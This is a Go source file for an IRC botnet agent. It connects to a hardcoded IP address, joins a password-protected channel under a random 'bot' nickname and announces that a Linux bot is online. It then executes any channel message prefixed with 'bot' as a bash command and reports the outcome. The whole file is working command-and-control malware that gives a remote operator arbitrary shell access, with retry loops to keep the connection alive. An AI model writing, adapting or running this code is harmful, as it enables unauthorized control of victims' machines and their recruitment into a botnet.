package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"strings"
	"time"
)

const (
	server   = "192.124.176.42:6667"
	channel  = "#ttk"
	password = "bot6677"
)

// generateNickname generates a nickname with "bot" prefix and 5 random digits
func generateNickname() string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprintf("bot%05d", rand.Intn(100000))
}

// connectToServer connects to the IRC server and handles communication
func connectToServer() {
	nickname := generateNickname()
	var conn net.Conn
	var err error

	for {
		conn, err = net.Dial("tcp", server)
		if err == nil {
			break
		}
		log.Printf("Failed to connect to IRC server: %v. Retrying in 5 seconds...", err)
		time.Sleep(5 * time.Second)
	}
	defer conn.Close()

	log.Printf("Connected to IRC server %s", server)

	// Send initial messages to register the bot
	sendMessage(conn, fmt.Sprintf("NICK %s\r\n", nickname))
	sendMessage(conn, fmt.Sprintf("USER %s 8 * :%s\r\n", nickname, nickname))

	// Join the specified channel with password
	sendMessage(conn, fmt.Sprintf("JOIN %s %s\r\n", channel, password))
	time.Sleep(1 * time.Second) // Wait a moment to ensure join is processed
	sendMessage(conn, fmt.Sprintf("PRIVMSG %s :%s\r\n", channel, "linux机器人上线+1"))

	// Start reading messages from the IRC server
	reader := bufio.NewReader(conn)
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Error reading from server: %v. Reconnecting in 5 seconds...", err)
			time.Sleep(5 * time.Second)
			connectToServer()
			return
		}
		line = strings.TrimSpace(line)
		fmt.Println(line)

		// Respond to PING messages from the server to keep the connection alive
		if strings.HasPrefix(line, "PING") {
			pongMsg := strings.Replace(line, "PING", "PONG", 1)
			sendMessage(conn, pongMsg+"\r\n")
		}

		// Check if the message starts with "bash"
		if strings.Contains(line, "PRIVMSG") && strings.Contains(line, "bot") {
			parts := strings.Split(line, ":")
			if len(parts) > 2 && strings.HasPrefix(parts[2], "bot") {
				cmd := strings.TrimPrefix(parts[2], "bot ")
				go executeCommand(conn, cmd)
			}
		}
	}
}

// sendMessage sends a message to the IRC server
func sendMessage(conn net.Conn, message string) {
	fmt.Printf("Sending: %s", message)
	_, err := conn.Write([]byte(message))
	if err != nil {
		log.Fatalf("Failed to send message: %v", err)
	}
}

// executeCommand executes a shell command and sends the output back to the channel
func executeCommand(conn net.Conn, cmd string) {
	out, err := exec.Command("bash", "-c", cmd).CombinedOutput()
	if err != nil {
		sendMessage(conn, fmt.Sprintf("PRIVMSG %s :执行命令时出错: %v\r\n", channel, err))
	} else {
		sendMessage(conn, fmt.Sprintf("PRIVMSG %s :命令成功执行\r\n", channel))
	}

	for _, line := range strings.Split(string(out), "\n") {
		if line != "" {
			//sendMessage(conn, fmt.Sprintf("PRIVMSG %s :%s\r\n", channel, line))
		}
	}
}

func main() {
	connectToServer()
}
